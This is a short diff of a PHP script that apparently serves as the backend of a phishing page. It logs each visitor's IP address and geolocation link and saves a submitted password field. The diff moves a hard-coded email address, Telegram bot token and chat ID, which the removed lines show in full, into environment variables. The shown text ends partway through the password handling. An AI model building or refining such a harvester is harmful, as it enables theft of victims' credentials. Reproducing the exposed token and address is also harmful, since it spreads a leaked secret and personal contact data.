@@ -1,18 +1,18 @@
 <?php
-// Configure your email and Telegram bot
-$yourEmail = "danyellekurtz.conway@outlook.com";
-$botToken = "7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg";
-$chatId = "7296145278";
+// Retrieve environment variables
+$yourEmail = getenv('YOUR_EMAIL');  // Fetch email from environment variables
+$botToken = getenv('BOT_TOKEN');    // Fetch Telegram bot token from environment variables
+$chatId = getenv('CHAT_ID');        // Fetch Telegram chat ID from environment variables
 
 // Capture the current timestamp
 $infoDate = date("d-m-Y h:i:sa");
 $ipAddress = $_SERVER['REMOTE_ADDR'] ?? "Unknown IP";
-$geoIpLink = "http://www.geoiptool.com/?IP=" . $ipAddress;
+$geoIpLink = "http://www.geoiptool.com/?IP=" . $ipAddress; 
 
 // Initialize $message to collect logs
 $message = "";
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+if ($_SERVER['REQUEST_METHOD'] === 'POST') { 
     // Process data based on available fields
     if (isset($_POST['pass'])) {
         $_SESSION['pass'] = $_POST['pass'];
